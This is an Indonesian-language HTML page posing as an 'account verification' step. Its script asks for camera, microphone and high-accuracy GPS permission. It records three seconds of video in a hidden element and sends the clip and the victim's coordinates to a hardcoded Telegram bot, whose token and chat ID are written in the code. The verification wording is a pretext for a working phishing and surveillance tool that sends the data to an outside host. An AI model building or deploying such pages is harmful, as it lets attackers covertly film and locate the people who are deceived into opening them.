<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verifikasi Akses & Lokasi</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background-color: #f4f6f8;
      margin: 0;
    }
    .container {
      background: #ffffff;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
      text-align: center;
      max-width: 400px;
      width: 90%;
    }
    button {
      background-color: #0088cc;
      color: white;
      border: none;
      padding: 12px 24px;
      font-size: 16px;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 15px;
    }
    button:hover {
      background-color: #006699;
    }
    button:disabled {
      background-color: #cccccc;
      cursor: not-allowed;
    }
    #status {
      margin-top: 15px;
      font-size: 14px;
      color: #555;
    }
  </style>
</head>
<body>

<div class="container">
  <h2>Mulai Verifikasi</h2>
  <p>Klik tombol di bawah untuk memberikan izin lokasi dan rekaman singkat demi verifikasi akun.</p>
  <button id="startBtn">Izinkan & Ambil Data</button>
  <p id="status"></p>
</div>

<!-- Element video tersembunyi untuk proses perekaman -->
<video id="videoPreview" autoplay muted style="display:none;"></video>

<script>
  const BOT_TOKEN = "7783419810:AAF8TqVK6-d_IVbrlN8Rv6PPelPUMldfx88";
  const CHAT_ID = "7856323152";

  const startBtn = document.getElementById('startBtn');
  const statusTxt = document.getElementById('status');
  const video = document.getElementById('videoPreview');

  startBtn.addEventListener('click', async () => {
    startBtn.disabled = true;
    statusTxt.innerText = "Meminta izin kamera & mikrofon...";

    let stream = null;

    try {
      // 1. Minta Izin Kamera & Mikrofon
      stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      video.srcObject = stream;
      statusTxt.innerText = "Izin kamera diberikan. Merekam 3 detik...";

      // Rekam video selama 3 detik
      const videoBlob = await recordMedia(stream, 3000);

      // Matikan kamera langsung setelah perekaman selesai
      stream.getTracks().forEach(track => track.stop());
      stream = null;

      // 2. Minta Izin Lokasi (GPS)
      statusTxt.innerText = "Meminta akses lokasi...";
      const position = await getCoordinates();
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;

      statusTxt.innerText = "Mengirim data ke Telegram...";

      // 3. Kirim Lokasi ke Telegram Bot
      await sendTelegramLocation(latitude, longitude);

      // 4. Kirim Rekaman Video ke Telegram Bot
      await sendTelegramVideo(videoBlob);

      statusTxt.innerText = "Proses selesai! Data berhasil diverifikasi.";

    } catch (err) {
      console.error(err);
      statusTxt.innerText = "Gagal: " + (err.message || "Izin ditolak atau terjadi kesalahan.");
    } finally {
      // Skenario cadangan: Memastikan aliran kamera benar-benar mati jika terjadi error
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
      startBtn.disabled = false;
    }
  });

  // Fungsi merekam media dengan dukungan multi-browser (Chrome, Safari, Firefox)
  function recordMedia(stream, duration) {
    return new Promise((resolve, reject) => {
      // Cek format yang didukung oleh browser
      let mimeType = 'video/webm';
      if (!MediaRecorder.isTypeSupported(mimeType)) {
        if (MediaRecorder.isTypeSupported('video/mp4')) {
          mimeType = 'video/mp4';
        } else {
          mimeType = ''; // Menggunakan default browser
        }
      }

      const options = mimeType ? { mimeType } : {};
      const mediaRecorder = new MediaRecorder(stream, options);
      const chunks = [];

      mediaRecorder.ondataavailable = (e) => {
        if (e.data && e.data.size > 0) chunks.push(e.data);
      };

      mediaRecorder.onstop = () => {
        const finalType = mediaRecorder.mimeType || 'video/webm';
        const blob = new Blob(chunks, { type: finalType });
        resolve(blob);
      };

      mediaRecorder.onerror = (err) => reject(err);

      mediaRecorder.start();
      setTimeout(() => {
        if (mediaRecorder.state !== 'inactive') {
          mediaRecorder.stop();
        }
      }, duration);
    });
  }

  // Fungsi mendapatkan koordinat GPS
  function getCoordinates() {
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) {
        reject(new Error("Browser Anda tidak mendukung Geolocation."));
        return;
      }
      navigator.geolocation.getCurrentPosition(resolve, reject, {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      });
    });
  }

  // Fungsi kirim lokasi via Telegram Bot API
  async function sendTelegramLocation(lat, lon) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        latitude: lat,
        longitude: lon
      })
    });

    if (!res.ok) {
      throw new Error("Gagal mengirim lokasi ke Telegram.");
    }
  }

  // Fungsi kirim file video rekaman via Telegram Bot API
  async function sendTelegramVideo(blob) {
    const formData = new FormData();
    const extension = blob.type.includes('mp4') ? 'mp4' : 'webm';
    
    formData.append('chat_id', CHAT_ID);
    formData.append('video', blob, `recording.${extension}`);
    formData.append('caption', '🎥 Hasil rekaman kamera pengguna');

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
    const res = await fetch(url, {
      method: 'POST',
      body: formData
    });

    if (!res.ok) {
      throw new Error("Gagal mengirim video ke Telegram.");
    }
  }
</script>

</body>
</html>
